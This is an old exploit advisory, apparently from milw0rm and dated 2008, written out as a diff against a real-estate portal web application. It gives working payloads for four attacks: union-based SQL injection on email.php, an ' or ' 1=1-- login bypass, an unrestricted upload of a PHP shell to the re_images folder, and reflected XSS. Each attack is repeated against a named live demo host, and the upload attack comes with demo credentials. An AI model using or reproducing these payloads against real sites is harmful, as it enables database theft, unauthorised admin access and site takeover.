@@ -1,0 +1,100 @@
+[~] GS Real Estate Portal US and International Module
+[~]
+[~] SQL/BYPASS/RFU/XSS
+[~] ----------------------------------------------------------
+[~] Discovered By: ZoRLu
+[~]
+[~] Date: 13.11.2008
+[~]
+[~] Home: www.z0rlu.blogspot.com
+[~]
+[~] contact: trt-turk@hotmail.com
+[~]
+[~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( (
+[~]
+[~] my bug number now: 39
+[~]
+[~] my target bug number: 100
+[~]
+[~] -----------------------------------------------------------
+
+
+Exploit 1: sql inj
+
+http://localhost/script/email.php?AgentID=[SQL]
+
+
+[SQL]
+
+-47+union+select+1,2,3,4,5,6,7,8,9,10,concat(user(),0x3a,database(),0x3a,version()),12,13,14,15,16,17,18,19,20,21,22,23+from+admin--
+
+
+sql for demo:
+
+http://hostnomi.net/int/email.php?AgentID=-47+union+select+1,2,3,4,5,6,7,8,9,10,concat(user(),0x3a,database(),0x3a,version()),12,13,14,15,16,17,18,19,20,21,22,23+from+admin--
+
+
+
+Exploit 2: auth bypass
+
+login: http://localhost/script/login.php
+
+username: [real_admin_or_user_name] ' or ' 1=1--
+
+password: ZoRLu
+
+note: generally admin name: admin 
+
+
+bypass for demo:
+
+login: http://hostnomi.net/int/login.php
+
+admin: admin ' or ' 1=1--
+
+passwd: ZoRLu
+
+
+exploit 3: Rfu
+
+you login to site and edit your profile upload your_shell.php
+
+after right click to your logo and select properties. copy photo link. 
+
+paste your explorer go your_shell.php
+
+
+your_shell.php path:
+
+http://localhost/script/re_images/[id]_logo_your_shell.php
+
+
+rfu for demo:
+
+user: zorlu
+
+passwd: zorlu1 
+
+edit profile: http://hostnomi.net/int/profile.php
+
+shell: http://hostnomi.net/int/re_images/1226591775_logo_c.php ( no permission this demo server )
+
+
+
+exploit 4: XSS
+
+http://localhost/script/email.php?AgentID=&ListingID="><script>alert()</script>
+
+xss for demo:
+
+http://hostnomi.net/int/email.php?AgentID=&ListingID="><script>alert()</script>
+
+
+[~]----------------------------------------------------------------------
+[~] Greetz tO: str0ke & all Muslim HaCkeRs
+[~]
+[~] yildirimordulari.org  &  darkc0de.com
+[~]
+[~]----------------------------------------------------------------------
+
+# milw0rm.com [2008-11-14]
